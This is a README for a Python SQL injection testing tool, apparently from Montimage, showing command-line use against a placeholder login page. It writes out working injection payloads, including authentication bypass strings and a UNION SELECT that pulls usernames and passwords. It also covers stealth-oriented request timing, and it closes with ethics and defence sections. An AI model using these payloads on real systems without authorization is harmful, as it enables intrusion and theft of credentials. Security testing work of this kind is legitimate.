# SQL Injection Attack Simulation

## Overview

SQL Injection is a code injection technique that exploits vulnerabilities in web applications that use SQL databases. Attackers can insert malicious SQL statements into entry fields, which can allow them to bypass authentication, access sensitive data, or even modify database contents.

This script simulates SQL injection attacks for educational and authorized security testing purposes.

## Features

- Multiple SQL injection payload testing
- Customizable target URLs and form fields
- Response analysis to detect vulnerabilities
- Payload loading from external files
- Detailed logging and statistics
- Success/failure tracking

## Requirements

- Python 3.6+
- Mechanize library (for web form interaction)
- Requests library (for HTTP requests)

## Installation

```bash
# Install required dependencies
pip install mechanize requests
```

## Usage

### Basic Attack

The simplest way to run an SQL injection attack simulation is to specify a target URL and the form control name:

```bash
python sql_injection.py -t http://vulnerable-website.com/login.php -c username
```

This will:
- Target the specified URL
- Focus on the form field named "username"
- Use default SQL injection payloads from the built-in list
- Use the default delay of 1 second between requests

### Using Custom Payloads

You can specify your own SQL injection payloads:

```bash
# Using comma-separated payloads
python sql_injection.py -t http://vulnerable-website.com/login.php -c username -q "' OR '1'='1', admin' --"
```

### Using a Payload File

For more comprehensive testing, you can use a file containing SQL injection payloads:

```bash
# Using a payload file (one payload per line)
python sql_injection.py -t http://vulnerable-website.com/login.php -c username -f sql-queries.txt
```

### Customizing the Attack

#### Adjust Delay Between Requests

To control the rate of requests:

```bash
# Use a 2-second delay between requests (more stealthy)
python sql_injection.py -t http://vulnerable-website.com/login.php -c username -d 2

# Use a 0.5-second delay (more aggressive)
python sql_injection.py -t http://vulnerable-website.com/login.php -c username -d 0.5
```

#### Set Request Timeout

To adjust how long to wait for each request:

```bash
# Use a 10-second timeout for each request
python sql_injection.py -t http://vulnerable-website.com/login.php -c username -T 10
```

#### Specify User Agent

To use a custom user agent:

```bash
python sql_injection.py -t http://vulnerable-website.com/login.php -c username -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
```

#### Use a Proxy

For routing requests through a proxy (useful for tools like Burp Suite):

```bash
python sql_injection.py -t http://vulnerable-website.com/login.php -c username -x http://127.0.0.1:8080
```

#### Enable Verbose Mode

For detailed output and debugging information:

```bash
python sql_injection.py -t http://vulnerable-website.com/login.php -c username -v
```

## Advanced Usage

### Testing Different Injection Points

SQL injection vulnerabilities can exist in different parts of a web application:

```bash
# Test username field
python sql_injection.py -t http://vulnerable-website.com/login.php -c username

# Test password field
python sql_injection.py -t http://vulnerable-website.com/login.php -c password

# Test search field
python sql_injection.py -t http://vulnerable-website.com/search.php -c query
```

### Creating Custom Payload Files

Different types of databases may require different SQL injection techniques:

```bash
# Create a MySQL-specific payload file
echo -e "' OR 1=1 -- -\n' UNION SELECT 1,2,3 -- -\n' UNION SELECT username,password,3 FROM users -- -" > mysql_payloads.txt

# Use the created payload file
python sql_injection.py -t http://vulnerable-website.com/login.php -c username -f mysql_payloads.txt
```

### Combining with Other Tools

For a more comprehensive security assessment, combine with other tools:

```bash
# Use with a proxy for request interception
python sql_injection.py -t http://vulnerable-website.com/login.php -c username -x http://127.0.0.1:8080 -v
```

## Ethical Considerations

This tool should ONLY be used for:
- Educational purposes
- Authorized security testing
- Web application vulnerability assessment

Unauthorized use against systems without explicit permission is illegal and unethical.

## Defensive Measures

Common defenses against SQL injection attacks include:

1. Prepared statements with parameterized queries
2. Stored procedures
3. Input validation and sanitization
4. Escaping special characters
5. Principle of least privilege for database accounts
6. Web Application Firewalls (WAF)

Understanding these attacks helps in implementing proper defenses.

## Command Line Options

```
-t, --target-url      Target URL (required)
-c, --control-name    Form control name to inject into (required)
-q, --queries         Comma-separated list of SQL injection payloads
-f, --file            File containing SQL injection payloads (one per line)
-d, --delay           Delay between requests in seconds (default: 1.0)
-T, --timeout         Request timeout in seconds (default: 30)
-a, --user-agent      Custom User-Agent string
-x, --proxy           Proxy URL (e.g., http://127.0.0.1:8080)
-v, --verbose         Enable verbose output
```

## License

Proprietary - Montimage
